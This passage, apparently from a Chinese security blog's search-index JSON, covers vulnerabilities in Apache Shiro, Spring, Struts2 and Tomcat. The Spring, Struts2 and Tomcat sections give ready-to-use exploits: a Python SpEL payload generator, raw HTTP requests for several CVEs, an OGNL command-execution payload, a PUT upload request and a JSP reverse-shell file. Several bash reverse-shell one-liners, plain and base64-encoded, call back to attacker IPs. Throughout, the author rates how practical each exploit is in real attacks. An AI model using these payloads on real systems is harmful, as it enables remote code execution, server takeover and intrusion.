Me这个功能，来记录用户登录的凭证，然后shiro会对用户传入的cookie进行解密并进行反序列化，服务端接收rememberMe的cookie值后的操作是：\u003c/p\u003e\n\u003cp\u003eCookie中rememberMe字段内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e    ---\u0026gt; Base64解码       \t\t      \r\n\r\n\r\n                     ---\u0026gt; 使用密钥进行AES-CBC解密            \t\t\t \r\n\r\n\r\n                                                ---\u0026gt; 反序列化\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e（2）由于该版本AES加密的密钥Key被硬编码在代码里（漏洞能够被利用的本质），且大部分项目未修改默认AES密钥，这意味着攻击者只要通过源代码找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化，AES加密，Base64编码，然后将其作为cookie的Remember Me字段值发送，Shiro将数据进行解密并且反序列化，最终触发反序列化漏洞。\u003c/p\u003e\n\u003cp\u003e官方针对这个漏洞的修复方式将使用默认硬编码的Key改为生成随机的Key加密。\u003c/p\u003e\n\u003cp\u003e密钥保存位置：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/zj_img/WEBRESOURCEe42a394535820c01dae3f4e45464ea1dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e最后的触发位置是标准的readobject()，所以利用链基本上就是CC链或者其他依赖链了。\u003c/p\u003e\n\u003ch3 id=\"cve-2019-12422shiro-721\"\u003eCVE-2019-12422/Shiro-721\u003c/h3\u003e\n\u003cp\u003eShiro \u0026lt; 1.4.2\u003c/p\u003e\n\u003cp\u003e在Apache Shiro 中用户进行登录的时候, 提供RemenberMe功能处理cookie，使用的是AES-128-CBC加密，可以通过Padding Oracle加密生成的攻击代码来重新构造一个恶意的rememberMe字段，可进行反序列化攻击。\u003c/p\u003e\n\u003cp\u003e跟Shiro无关，而是对Shiro采用的加密方式进行的攻击，所以略过，只要了解了Padding Oracle Attack 原理就能理解这个攻击的原理，这里推荐Padding Oracle Attack(填充提示攻击)详解及验证。\u003c/p\u003e\n\u003cp\u003e简单来说，Padding Oracle Attack是根据CBC字节翻转攻击、Padding规则以及服务端解密后返回的不同状态来穷举中间值进而获取明文的攻击。解密出的明文填充的正确与否可通过服务端的响应进行区分。通过不断调整发送的密文分组，然后根据服务端的结果进行爆破测试，可推测出确定的解密值。当应用程序接受到加密后的值以后，可能有以下三种返回：\u003c/p\u003e\n\u003cp\u003e1、接受到正确的密文之后（填充正确且包含正确的值），应用程序正常返回：200 OK。\u003c/p\u003e\n\u003cp\u003e2、接受到合法的密文（填充正确，但解密后得到一个不正确的值），应用程序显示自定义错误消息：200 OK。\u003c/p\u003e\n\u003cp\u003e3、接受到非法的密文之后（解密后发现填充不正确），应用程序抛出一个解密异常：500 Internal Server Error。\u003c/p\u003e\n\u003cp\u003e我们不需要要求解密后必须是正确的值，只要返回200 ok即可。\u003c/p\u003e\n\u003cp\u003eaes gcm加密方式不一样的\u003c/p\u003e\n\u003ch3 id=\"cve-2020-1957认证绕过漏洞\"\u003eCVE-2020-1957/认证绕过漏洞\u003c/h3\u003e\n\u003cp\u003eShiro \u0026lt;  1.5.2\u003c/p\u003e\n\u003cp\u003espring Boot中使用Apache Shiro进行身份验证、权限控制时，可以精心构造恶意的URL，利用Apache Shiro和Spring Boot对URL的处理的差异化，可以绕过Apache Shiro对Spring Boot中的Servlet的权限控制，越权并实现未授权访问。\u003c/p\u003e","title":"shiro"},{"content":"一、Spring生态 Spring开源框架由Rod Johnson创建，从简单性、可测试性和松耦合的角度而言， 任何Java应用都可以从Spring中受益。 时至今日Spring已不再是一个简单的编程框架了，在整个Spring生态中包含了许多 应用在特定场景的具体框架，如：“Spring Framework”，“Spring Security”，“Spring Boot”，“Spring Cloud”等等，其中“Spring Framework”框架是 整个生态的核心基础，每个框架都有自己独立的代码仓库。\nSpring生态系统提供许多有用的编程框架或工具集。 当下最为流行的Spring项目： Spring Framework，Spring Security，Spring Boot，Spring Cloud等。\nSpring Framework Spring Framework项目是整个Spring生态的基础，Spring Framework项目又包含多个子模块，如：spring-core，spring-beans，spring-context，spring-aop，spring web，spring-webmvc等等。\nSpring Boot Spring Boot是一个开发基于Spring Framework的项目，它默认集成了嵌入式 Tomcat，配置注解化，支持快速集成第三方开发组件（如MyBatis），大大降低了使用 Spring的门槛，而且内置了许多可以直接用于生产环境的功能，是目前用于开发微服务架构项目的不二选择。\nSpring Cloud Spring Cloud为开发基于微服务架构的软件系统提供了一整套工具集合，其中包含了开发各个微服务组件的具体项目，如：Spring Cloud Config（配置中心），Spring Cloud Netflix（服务注册中心），Spring Cloud Sleuth（服务调用监控），Spring Cloud Gateway（服务网关）等等。 Spring Cloud的基础是Spring Boot，基于Spring Boot可以大大简化开发各微服务组件 的流程。\nSpring Security Spring Security是用于实现认证和授权，以及访问控制的安全框架，在Java生态与之提 供类似的功能还有一个框架：Apache Shiro。 Spring Security依赖于Spring Framework，也就是说如果要使用Spring Security，那 么应用架构也必须是基于Spring Framework的，这大大限制了Spring Security的使用场景；反之，Shiro就没有这样限制，而且从项目架构上Shiro更加简洁。当然，Spring Security提供了非常丰富的安全控制的功能，在某些方面甚至比Shiro更加完善，与之对 应的是掌握的Spring Security的复杂度比较大。因此，对于在应用中是否选择Spring Security需要根据实际需求来决定。\n二、漏洞原理 Spring于2002年最早提出并随后创建，2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL (Spring Expression Language)。SpEL(Spring Expression Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。\n三、漏洞利用 1、Spring Security OAuth2远程命令执行 CVE-2016-4977 oauth/authorize路径下，认证后漏洞，所以实战需要先爆破或者获取密码，也可以认为漏洞特征，发现可配合插件进行发现\n影响版本：\n2.0.0-2.0.9 1.0.0-1.0.5\nPOC生成脚本：\n#!/usr/bin/env python\rimport base64\rmessage = input(\u0026#39;Enter message to encode:\u0026#39;)\rmessage = \u0026#39;bash -c {echo,%s}|{base64,-d}|{bash,-i}\u0026#39; % bytes.decode(base64.b64encode(message.encode(\u0026#39;utf-8\u0026#39;)))\rprint(message)\rpoc = \u0026#39;${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)\u0026#39; % ord(message[0])\rfor ch in message[1:]:\rpoc += \u0026#39;.concat(T(java.lang.Character).toString(%s))\u0026#39; % ord(ch)\rpoc += \u0026#39;)}\u0026#39;\rprint(poc) 2、Spring Web Flow框架远程代码执行(CVE-2017-4971) Spring Web Flow是Spring的一个子项目，主要目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力，Spring WebFlow是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其2.4.0 - 2.4.4 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。\nPOC：\n原POC:\r\u0026amp;_(new java.lang.ProcessBuilder(\u0026#34;bash\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.2.40/8888 0\u0026gt;\u0026amp;1\u0026#34;)).start()=vulhub\rURL编码后：\r\u0026amp;_(new java.lang.ProcessBuilder(\u0026#34;bash\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;bash+-i+\u0026gt;%26+/dev/tcp/192.168.2.40/8888 0\u0026gt;%261\u0026#34;)).start()=vulhub 但是该漏洞，暂无良好的发现or扫描方式，导致实用性极差.\n3、Spring Data Rest远程命令执行命令（CVE-2017-8046） 简单介绍：\nSpring Data是对数据访问的更高抽象。通过它，开发者进一步从数据层解放出来，更专注于业务逻辑。不管是关系型数据还是非关系型数据，利用相应接口，开发者可以使用非常简单的代码构建对数据的访问。\n漏洞原理：\nPivotal官方发布通告表示Spring-data-rest服务器在处理PATCH请求时存在一个远程代码执行漏洞（CVE-2017-8046）。攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码。\n影响版本：\nSpring Data REST versions \u0026lt; 2.5.12, 2.6.7, 3.0 RC3\nSpring Boot version \u0026lt; 2.0.0M4\nSpring Data release trains \u0026lt; Kay-RC3\n可能特征：\nRestful风格的API服务器\nPOC：\n第一步：\n\u0026#34;,\u0026#34;.join(map(str, (map(ord,\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\u0026#34;)))) 第二步十进制编码：\n第三步：\n该漏洞因为涉及编码等问题，以及无明显特征，同样实用性较低\n4、Spring Messaging远程命令执行突破（CVE-2018-1270） Spring框架中的 spring-messaging 模块提供了一种基于WebSocket的STOMP协议实现，STOMP消息代理在处理客户端消息时存在SpEL表达式注入漏洞，在spring messages中，其允许客户端订阅消息，并使用selector过滤消息，selector用SpEL表达编写，并使用StandardEvaluationContext解析，攻击者可以通过构造恶意的消息来实现远程代码执行。\n影响范围：\nSpring Framework 5.0 to 5.0.4.\nSpring Framework 4.3 to 4.3.14\n该漏洞实战能力极弱\n5、Spring Data Commons 远程命令执行漏洞（CVE-2018-1273） Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。\n影响范围：\nSpring Data Commons 1.13至1.13.10（Ingalls SR10）\nSpring Data REST 2.6至2.6.10（Ingalls SR10）\nSpring Data Commons 2.0至2.0.5（Kay SR5）\nSpring Data REST 3.0至3.0.5（Kay SR5）\nPOC:\nPOST /users?page=\u0026amp;size=5 HTTP/1.1\rHost: 192.168.2.66:8080\rConnection: keep-alive\rContent-Length: 124\rPragma: no-cache\rCache-Control: no-cache\rOrigin: http://localhost:8080\rUpgrade-Insecure-Requests: 1\rContent-Type: application/x-www-form-urlencoded\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\rReferer: http://localhost:8080/users?page=0\u0026amp;size=5\rAccept-Encoding: gzip, deflate, br\rAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\rusername[#this.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getRuntime().exec(\u0026#34;touch /tmp/success\u0026#34;)]=\u0026amp;password=\u0026amp;repeatedPassword= 该漏洞反弹shell，需要使用文件下载脚本，配合执行进行上线，同时无法判断漏洞特征，所以同样实用性较弱\n6、Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947） Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。\n漏洞发现：\n/actuator/gateway/路径未授权\n漏洞利用：\n手动需要分多步：\n第一步添加路由： POST /actuator/gateway/routes/hacktest HTTP/1.1\rHost: localhost:8080\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\rConnection: close\rContent-Type: application/json\rContent-Length: 329\r{\r\u0026#34;id\u0026#34;: \u0026#34;hacktest\u0026#34;,\r\u0026#34;filters\u0026#34;: [{\r\u0026#34;name\u0026#34;: \u0026#34;AddResponseHeader\u0026#34;,\r\u0026#34;args\u0026#34;: {\r\u0026#34;name\u0026#34;: \u0026#34;Result\u0026#34;,\r\u0026#34;value\u0026#34;: \u0026#34;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\u0026#34;id\\\u0026#34;}).getInputStream()))}\u0026#34;\r}\r}],\r\u0026#34;uri\u0026#34;: \u0026#34;http://example.com\u0026#34;\r} 第二步刷新路由： POST /actuator/gateway/refresh HTTP/1.1\rHost: 192.168.2.66:8080\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\rConnection: close\rContent-Type: application/json\rContent-Length: 0 第三步查看命令： GET /actuator/gateway/routes/ HTTP/1.1\rHost: 192.168.2.66:8080\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\rConnection: close\rContent-Type: application/json\rContent-Length: 0 第四步删除路由： DELETE /actuator/gateway/routes/hacktest HTTP/1.1\rHost: 192.168.2.66:8080\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\rConnection: close\rContent-Type: application/json\rContent-Length: 0\r刷新后，重新访问：\n目前有发现直接反弹shell工具，以及数量不多的内存马工具。\n7、Spring Cloud Function SpEL 表达式注入 CVE-2022-22963 Spring Cloud Function是基于Spring Boot 的函数计算框架（FaaS）,当其启用动态路由functionRoute时，HTTP请求头spring.cloud.function.routing-expression参数存在SPEL表达式注入漏洞，恶意攻击者可通过此漏洞发送恶意请求，在服务器执行任意代码。\n3.0.0.M3 \u0026lt;= Spring Cloud Function \u0026lt;=3.2.2\nPOC:\nPOST /functionRouter HTTP/1.1\rHost: localhost:8080\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\rConnection: close\rspring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\u0026#34;touch /tmp/success\u0026#34;)\rContent-Type: text/plain\rContent-Length: 4\rtest 反弹shell，需要base64规避字符串分割问题：\nPOST /functionRouter HTTP/1.1\rHost: localhost:8080\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\rConnection: close\rspring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\u0026#34;)\rContent-Type: text/plain\rContent-Length: 4\rtest 此漏洞较为简单，插件可扫描，为重点关注对象。但插件检测结果欠佳，python命令行工具可检测：\n8、Spring框架Data Binding与JDK 9+导致的远程代码执行漏洞（CVE-2022-22965） 也就是Spring core RCE SpringMVC支持将HTTP请求中的的请求参数或者请求体内容，根据Controller方法的参数，自动完成类型转换和赋值，同时SpringMVC支持多层嵌套的参数绑定。攻击者通过HTTP请求修改日志文件的文件名、文件内容、文件后缀、文件存放路径参数的值，从而在服务器生成木马文件，造成RCE。\n影响范围：\nJDK版本：JDK 9+\nSpring Framework版本：\nSpring Framework 5.3.X \u0026lt; 5.3.18\nSpring Framework 5.2.X \u0026lt; 5.2.20\n注：其他小版本未更新均受影响\n影响中间件：Tomcat\n检测方式：插件+python工具\n坑点：1、插件告知可能存在漏洞；\n2、由于漏洞原理，造成可能要扫描多次的情况出现：\n9、Spring Security Authorization(CVE-2022-22978) 目前来看是垃圾洞\nPOC：\n%0a\rhttp://your-ip:8080/admin/%0atest ","permalink":"https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/","summary":"\u003ch1 id=\"一spring生态\"\u003e一、Spring生态\u003c/h1\u003e\n\u003cp\u003eSpring开源框架由Rod Johnson创建，从简单性、可测试性和松耦合的角度而言， 任何Java应用都可以从Spring中受益。 时至今日Spring已不再是一个简单的编程框架了，在整个Spring生态中包含了许多 应用在特定场景的具体框架，如：“Spring Framework”，“Spring Security”，“Spring Boot”，“Spring Cloud”等等，其中“Spring Framework”框架是 整个生态的核心基础，每个框架都有自己独立的代码仓库。\u003c/p\u003e\n\u003cp\u003eSpring生态系统提供许多有用的编程框架或工具集。 当下最为流行的Spring项目： Spring Framework，Spring Security，Spring Boot，Spring Cloud等。\u003c/p\u003e\n\u003ch2 id=\"spring-framework\"\u003eSpring Framework\u003c/h2\u003e\n\u003cp\u003eSpring Framework项目是整个Spring生态的基础，Spring Framework项目又包含多个子模块，如：spring-core，spring-beans，spring-context，spring-aop，spring web，spring-webmvc等等。\u003c/p\u003e\n\u003ch2 id=\"spring-boot\"\u003eSpring Boot\u003c/h2\u003e\n\u003cp\u003eSpring Boot是一个开发基于Spring Framework的项目，它默认集成了嵌入式 Tomcat，配置注解化，支持快速集成第三方开发组件（如MyBatis），大大降低了使用 Spring的门槛，而且内置了许多可以直接用于生产环境的功能，是目前用于开发微服务架构项目的不二选择。\u003c/p\u003e\n\u003ch2 id=\"spring-cloud\"\u003eSpring Cloud\u003c/h2\u003e\n\u003cp\u003eSpring Cloud为开发基于微服务架构的软件系统提供了一整套工具集合，其中包含了开发各个微服务组件的具体项目，如：Spring Cloud Config（配置中心），Spring Cloud Netflix（服务注册中心），Spring Cloud Sleuth（服务调用监控），Spring Cloud Gateway（服务网关）等等。 Spring Cloud的基础是Spring Boot，基于Spring Boot可以大大简化开发各微服务组件 的流程。\u003c/p\u003e\n\u003ch2 id=\"spring-security\"\u003eSpring Security\u003c/h2\u003e\n\u003cp\u003eSpring Security是用于实现认证和授权，以及访问控制的安全框架，在Java生态与之提 供类似的功能还有一个框架：Apache Shiro。 Spring Security依赖于Spring Framework，也就是说如果要使用Spring Security，那 么应用架构也必须是基于Spring Framework的，这大大限制了Spring Security的使用场景；反之，Shiro就没有这样限制，而且从项目架构上Shiro更加简洁。当然，Spring Security提供了非常丰富的安全控制的功能，在某些方面甚至比Shiro更加完善，与之对 应的是掌握的Spring Security的复杂度比较大。因此，对于在应用中是否选择Spring Security需要根据实际需求来决定。\u003c/p\u003e\n\u003ch1 id=\"二漏洞原理\"\u003e二、漏洞原理\u003c/h1\u003e\n\u003cp\u003eSpring于2002年最早提出并随后创建，2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL (Spring Expression Language)。SpEL(Spring Expression Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。\u003c/p\u003e","title":"Spring"},{"content":"一、Struts2 Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。\n二、漏洞原理 Struts2设计了一套OGNL的模式来操作数据。OGNL（Object Graph Navigation Language）即对象图形导航语言，通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化,是语义字符串与Java对象之间沟通的桥梁。OGNL支持对象方法调用，支持类静态的方法调用和值访问，在java中的格式：\n@[类全名]@[方法名|值名]\n@java.lang.String@format(\u0026lsquo;foo %s\u0026rsquo;, \u0026lsquo;bar\u0026rsquo;)| APP_NAME；\nStruts2的漏洞数量众多，其本质都是一样的(除了S2-052以外)，都是Struts2框架执行了恶意用户传进来的OGNL表达式，可以造成“命令执行、服务器文件操作、打印回显、获取系统属性、危险代码执行”等，只不过需要精心构造不同的OGNL代码而已。\nS2-052漏洞\n这个漏洞也算是轰动一时，其实，跟注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。\n同时struts2的漏洞时间也很长，S2-001发现时间为2007年，而较近的S2-061时间为2020年，跨度很大。\n三、漏洞特征 .action .do的请求路径\n四、漏洞利用 S2-057 以下直接梭哈：Struts2_工具v18.09\nS2-061 S2-062\n编写反弹shell代码\nbash -i \u0026gt;\u0026amp; /dev/tcp/192.168.52.130/3333 0\u0026gt;\u0026amp;1\n反弹shell涉及到管道符问题要将命令进行base64编码\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\nPOST /index.action HTTP/1.1\rHost: localhost:8080\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\rConnection: close\rContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\rContent-Length: 829\r------WebKitFormBoundaryl7d1B1aGsV2wcZwF\rContent-Disposition: form-data; name=\u0026#34;id\u0026#34;\r%{(#instancemanager=#application[\u0026#34;org.apache.tomcat.InstanceManager\u0026#34;]).(#stack=#attr[\u0026#34;com.opensymphony.xwork2.util.ValueStack.ValueStack\u0026#34;]).(#bean=#instancemanager.newInstance(\u0026#34;org.apache.commons.collections.BeanMap\u0026#34;)).(#bean.setBean(#stack)).(#context=#bean.get(\u0026#34;context\u0026#34;)).(#bean.setBean(#context)).(#macc=#bean.get(\u0026#34;memberAccess\u0026#34;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\u0026#34;java.util.HashSet\u0026#34;)).(#bean.put(\u0026#34;excludedClasses\u0026#34;,#emptyset)).(#bean.put(\u0026#34;excludedPackageNames\u0026#34;,#emptyset)).(#arglist=#instancemanager.newInstance(\u0026#34;java.util.ArrayList\u0026#34;)).(#arglist.add(\u0026#34;id\u0026#34;)).(#execute=#instancemanager.newInstance(\u0026#34;freemarker.template.utility.Execute\u0026#34;)).(#execute.exec(#arglist))}\r------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- ","permalink":"https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/","summary":"\u003ch1 id=\"一struts2\"\u003e一、Struts2\u003c/h1\u003e\n\u003cp\u003eStruts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。\u003c/p\u003e\n\u003ch1 id=\"二漏洞原理\"\u003e二、漏洞原理\u003c/h1\u003e\n\u003cp\u003eStruts2设计了一套OGNL的模式来操作数据。OGNL（Object Graph Navigation Language）即对象图形导航语言，通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化,是语义字符串与Java对象之间沟通的桥梁。OGNL支持对象方法调用，支持类静态的方法调用和值访问，在java中的格式：\u003c/p\u003e\n\u003cp\u003e@[类全名]@[方法名|值名]\u003c/p\u003e\n\u003cp\u003e@java.lang.String@format(\u0026lsquo;foo %s\u0026rsquo;, \u0026lsquo;bar\u0026rsquo;)| APP_NAME；\u003c/p\u003e\n\u003cp\u003eStruts2的漏洞数量众多，其本质都是一样的(除了S2-052以外)，都是Struts2框架执行了恶意用户传进来的OGNL表达式，可以造成“命令执行、服务器文件操作、打印回显、获取系统属性、危险代码执行”等，只不过需要精心构造不同的OGNL代码而已。\u003c/p\u003e\n\u003cp\u003eS2-052漏洞\u003c/p\u003e\n\u003cp\u003e这个漏洞也算是轰动一时，其实，跟注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。\u003c/p\u003e\n\u003cp\u003e同时struts2的漏洞时间也很长，S2-001发现时间为2007年，而较近的S2-061时间为2020年，跨度很大。\u003c/p\u003e\n\u003ch1 id=\"三漏洞特征\"\u003e三、漏洞特征\u003c/h1\u003e\n\u003cp\u003e.action   .do的请求路径\u003c/p\u003e\n\u003ch1 id=\"四漏洞利用\"\u003e四、漏洞利用\u003c/h1\u003e\n\u003cp\u003eS2-057 以下直接梭哈：Struts2_工具v18.09\u003c/p\u003e\n\u003cp\u003eS2-061  S2-062\u003c/p\u003e\n\u003cp\u003e编写反弹shell代码\u003c/p\u003e\n\u003cp\u003ebash -i \u0026gt;\u0026amp; /dev/tcp/192.168.52.130/3333 0\u0026gt;\u0026amp;1\u003c/p\u003e\n\u003cp\u003e反弹shell涉及到管道符问题要将命令进行base64编码\u003c/p\u003e\n\u003cp\u003ebash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePOST /index.action HTTP/1.1\r\nHost: localhost:8080\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\r\nConnection: close\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Length: 829\r\n\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\u0026#34;id\u0026#34;\r\n\r\n%{(#instancemanager=#application[\u0026#34;org.apache.tomcat.InstanceManager\u0026#34;]).(#stack=#attr[\u0026#34;com.opensymphony.xwork2.util.ValueStack.ValueStack\u0026#34;]).(#bean=#instancemanager.newInstance(\u0026#34;org.apache.commons.collections.BeanMap\u0026#34;)).(#bean.setBean(#stack)).(#context=#bean.get(\u0026#34;context\u0026#34;)).(#bean.setBean(#context)).(#macc=#bean.get(\u0026#34;memberAccess\u0026#34;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\u0026#34;java.util.HashSet\u0026#34;)).(#bean.put(\u0026#34;excludedClasses\u0026#34;,#emptyset)).(#bean.put(\u0026#34;excludedPackageNames\u0026#34;,#emptyset)).(#arglist=#instancemanager.newInstance(\u0026#34;java.util.ArrayList\u0026#34;)).(#arglist.add(\u0026#34;id\u0026#34;)).(#execute=#instancemanager.newInstance(\u0026#34;freemarker.template.utility.Execute\u0026#34;)).(#execute.exec(#arglist))}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\n\u003c/code\u003e\u003c/pre\u003e","title":"Struts2"},{"content":"一、Tomcat Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。\n二、漏洞介绍与利用 1、PUT文件上传 CVE-2017-12615 主要影响版本：\nTomcat 7.0.0-7.0.81\nPOC：此漏洞较为简单，可梭哈\nTomcat 7.0.0-7.0.81\nPOC：\rPUT /1.txt/ HTTP/1.1\rHost: 192.168.2.66:8080\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\rAccept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\rReferer: http://192.168.2.66:8080/tomcat.css\rAccept-Encoding: gzip, deflate\rAccept-Language: zh-CN,zh;q=0.9\rConnection: close\rContent-Length: 3\rcxk 2、AJP文件包含 由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。\n此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。\n影响版本：\nApache Tomcat 6\nApache Tomcat 7\u0026lt; 7.0.100\nApache Tomcat 8\u0026lt; 8.5.51\nApache Tomcat 9\u0026lt; 9.0.31\n此漏洞无法梭哈检测，需要指定8009端口和访问文件，工具可利用\n利用方式：\n1、上传JSP反弹shell文件，内容如下：\n\u0026lt;%Runtime.getRuntime().exec(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\u0026#34;);%\u0026gt; 2、文件包含反弹shell:\n3、弱密码\n先从低版本tomcat管理控制台进行弱口令爆破tomcat-6.0.9，在7.x 后的版本加入了防暴力破解，所以针对tomcat 7.x 以后的版本不用考虑爆破。\n","permalink":"https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/tomcat/","summary":"\u003ch1 id=\"一tomcat\"\u003e一、Tomcat\u003c/h1\u003e\n\u003cp\u003eTomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 